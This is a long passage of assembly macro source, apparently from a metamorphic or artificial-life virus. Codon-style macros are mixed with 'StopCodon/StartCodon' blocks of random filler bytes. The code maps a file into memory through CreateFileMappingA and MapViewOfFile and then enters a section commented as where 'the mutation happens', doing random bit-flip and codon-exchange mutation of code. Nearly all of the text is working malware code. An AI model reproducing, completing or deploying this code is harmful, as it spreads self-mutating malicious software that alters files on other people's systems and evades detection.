_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
       _addsaved
       _push
    _getDO
    BigNum=hGetFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 137
db 246
db 112
db 72
db 178
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
db StopCodon
db 15
db 226
db 31
db 106
db 2
db 255
db 231
db 33
db 35
db 110
db 215
db 163
db 105
db 238
db 230
db 178
db 29
db 246
db 179
db 163
db 83
db 73
db 224
db 83
db 79
db 141
db 224
db 232
db 129
db 175
db 231
db 225
db 249
db 162
db 242
db 71
db 245
db 137
db 75
db 178
db 95
db StartCodon
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
db StopCodon
db 93
db 199
db 126
db 131
db 80
db 226
db 21
db StartCodon
       _writeDWord              ; mov dword[FileSize], RegA
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
       _push
       _addsaved
       _push
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _push
    BigNum=4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 172
db 9
db 87
db 237
db 2
db 145
db 192
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
db StopCodon
db 227
db 56
db 188
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _push
    _getDO
    BigNum=FileHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _push
    _getDO
    BigNum=hCreateFileMappingA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 71
db 178
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=MapHandle-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
       _writeDWord               ; mov dword[MapHandle], RegA
       _save
    _getDO
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _push   ; [FileSize]
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 58
db 146
db 63
db 197
db 11
db 105
db 110
db 205
db 90
db 108
db 239
db 69
db 191
db 39
db 255
db 177
db 30
db 85
db 56
db 32
db 224
db 166
db 177
db 10
db 22
db 196
db 228
db 7
db 182
db 194
db 239
db 33
db 184
db 171
db 27
db 116
db 210
db 221
db 124
db 125
db 0
db 5
db 216
db 137
db 132
db 253
db 85
db 116
db 206
db 140
db 165
db 28
db 40
db 38
db 223
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
       _push   ; 0
db StopCodon
db 66
db 55
db 48
db 222
db 69
db 72
db 114
db 77
db 10
db 98
db 201
db StartCodon
       _push   ; 0
    BigNum=2
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 193
db 199
db 150
db 228
db 9
db 32
db 130
db 130
db 187
db 215
db 103
db 88
db 86
db 195
db 116
db 4
db 70
db 172
db 251
db 95
db 103
db 12
db 205
db 139
db 151
db 205
db 62
db 172
db 67
db 128
db 186
db 126
db 215
db 248
db 199
db 230
db 151
db 130
db 3
db 241
db 157
db 2
db 96
db 185
db 122
db 231
db 162
db 19
db 149
db 9
db 252
db 82
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _push
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
       _addsaved
       _push   ; MapHandle
    _getDO
    BigNum=hMapViewOfFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 105
db 64
db 226
db 8
db 28
db 72
db 29
db 72
db 177
db 26
db 125
db 144
db 75
db 183
db 30
db 2
db 236
db 239
db 146
db 87
db 103
db 64
db 189
db 114
db 142
db 79
db StartCodon
        _popall                 ; restore all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 144
db 114
db 144
db 159
db 132
db 190
db 181
db 168
db 167
db 36
db 221
db 226
db 51
db 250
db 116
db 245
db 64
db 222
db 78
db 91
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
    _getdata
    _call
    _getDO
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
       _nopsA
       _writeDWord              ; mov dword[MapPointer], RegA
db StopCodon
db 226
db 173
db 40
db 204
db 1
db 2
db 175
db 101
db 47
db 14
db 156
db 45
db 50
db 200
db 48
db 15
db 24
db 134
db 41
db 119
db 232
db 194
db 47
db 119
db 23
db 116
db 48
db 148
db 176
db 24
db 174
db 146
db 219
db 244
db 99
db 38
db 114
db 210
db 72
db 26
db 22
db 216
db 212
db 214
db 186
db 108
db 225
db 17
db 113
db 33
db 36
db 20
db 106
db 70
db 71
db 212
db 217
db 217
db 248
db 37
db 180
db 97
db 64
db 124
db 125
db 212
db 50
db 137
db 164
db 161
db 73
db 215
db 102
db 210
db 122
db 17
db 135
db 158
db 90
db 75
db 239
db 14
db 19
db 232
db 210
db 63
db 132
db 98
db 245
db 253
db 69
db 209
db 58
db 164
db 46
db 99
db StartCodon
       _nopsA
       _nopdB                  ; mov RegB, RegA+AminoStartInMap
; ############################################################################
; ############################################################################
; #####
; #####  Here the mutation happens: Bitmutation, exchange of codons, ...
db StopCodon
db 242
db 57
db 219
db 50
db StartCodon
; #####
;ANextByteInChain:
       _getEIP
       _sub0001
       _sub0001
db StopCodon
db 45
db 143
db 233
db 88
db 206
db 1
db 34
db 207
db 225
db 219
db 244
db 150
db 0
db 34
db 77
db 85
db 111
db 162
db 84
db 57
db 97
db 244
db 227
db 87
db 122
db 34
db 138
db 65
db 28
db 16
db 238
db 111
db 127
db 249
db 197
db 226
db 207
db 14
db 202
db 7
db 250
db StartCodon
       _sub0001
       _sub0001
       _sub0001
       _saveJmpOff              ; mov BA2, eip
       _nopsB
       _push                    ; push counter
; ############################################################################
; ##### Start Bit-Flip Mutation (Point-Mutation)
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
db StopCodon
db 151
db 17
db StartCodon
    BigNum=12
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 52
db 132
db 227
db 106
db 127
db 56
db StartCodon
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 19
db 71
db 157
db 203
db 11
db 212
db 2
db 13
db 225
db 45
db 141
db 91
db 141
db 71
db 171
db 241
db 206
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 120
db 245
db 25
db 172
db 69
db 184
db 146
db 235
db 62
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _shr
       _push
db StopCodon
db 42
db 147
db 55
db 123
db 235
db 175
db 119
db 143
db StartCodon
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=7
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 244
db 225
db 29
db 9
db 61
db 145
db 244
db 192
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
db StopCodon
db 225
db 237
db 156
db 128
db 90
db 184
db 121
db 119
db 86
db 226
db 22
db 54
db 247
db 93
db StartCodon
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
       _pop
       _and                     ; BC1=[RandomNumber shr 12] && 0111b
       _save
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 22
db 105
db 134
db 96
db 47
db 198
db 100
db 119
db 187
db 252
db 130
db 93
db 49
db 81
db 240
db 124
db 163
db 56
db 80
db 24
db 145
db 8
db 255
db 203
db 143
db 187
db 148
db 249
db 93
db 241
db 75
db 6
db 220
db 189
db 250
db 144
db 224
db 194
db 98
db 181
db 200
db 213
db 10
db 51
db 20
db 107
db 209
db 14
db StartCodon
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 197
db 213
db 109
db 109
db 24
db 213
db 94
db 69
db 181
db 251
db 69
db 157
db 249
db 64
db 118
db 66
db 223
db 148
db 72
db 64
db 197
db 100
db 87
db 31
db 225
db 38
db 235
db 246
db 83
db 244
db 32
db 236
db 211
db 97
db 40
db 44
db 138
db 230
db 2
db 35
db 181
db 235
db 254
db 39
db 192
db 78
db 183
db 47
db 180
db 209
db 131
db 239
db 161
db 15
db 171
db 49
db 3
db StartCodon
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 12
db 148
db 119
db 213
db 63
db 232
db 210
db 22
db 26
db 153
db 46
db 46
db 188
db 145
db 144
db 135
db 58
db 125
db 59
db 51
db 217
db 247
db 12
db 123
db 225
db 210
db 17
db 159
db 108
db 43
db 81
db 154
db 239
db 54
db 142
db 120
db 162
db 54
db 110
db 180
db 169
db 182
db 154
db 46
db 208
db 182
db 148
db 65
db 31
db 171
db 221
db 187
db 175
db 190
db 87
db 105
db 196
db 176
db 38
db 31
db 36
db 69
db 18
db 24
db 218
db 184
db 244
db 218
db 204
db 188
db 32
db 70
db 176
db 23
db 14
db 65
db 233
db 102
db 163
db 115
db 8
db 96
db 26
db 54
db 53
db 207
db 159
db 160
db 165
db 131
db 184
db 50
db 100
db 54
db 76
db 169
db 197
db 57
